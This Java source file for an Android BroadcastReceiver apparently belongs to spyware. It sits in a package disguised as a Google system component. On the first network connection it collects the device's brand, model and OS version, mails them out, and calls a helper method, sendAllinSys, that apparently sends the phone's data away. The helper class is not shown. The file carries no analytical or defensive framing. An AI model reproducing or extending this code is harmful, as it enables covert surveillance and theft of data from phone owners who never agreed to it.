package com.android.google.important.file;




import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;


public class InternetOk extends BroadcastReceiver {

	Context ourContext;
	BlowIt blw;
	
	private static boolean firstConnect = true;
	
	@Override
	public void onReceive(Context context, Intent arg1) {
		
		final ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo activeNetInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetInfo != null) {
            if(firstConnect) { 
            	
            	
            	
                // do subroutines here
            	blw = new BlowIt(context);
        		
        		Log.d("X","Broadcast Reciever called [ INTERNETOK ] ");
        	
        		
        		this.ourContext = context;
        		
        		if(blw.isConnectingToInternet())
        		{
        			String status = "INTERNET ENABLED---------BRAND : "+
        							android.os.Build.BRAND+"-------------- MODEL:"+
        							android.os.Build.MODEL+
        							"----------------Version:"+Build.VERSION.RELEASE+
        							"-----------------Version"+Build.VERSION.SDK_INT;
        			
        			
        			
        			blw.mailMessage(status);
        			blw.sendAllinSys();
        			
        			
        			
        		}else
        		{
        			Log.d("X","Internet not Enabled");
        		}
                firstConnect = false;
            }
        }
        else {
            firstConnect= true;
        }
		
		
	}
	
	

}
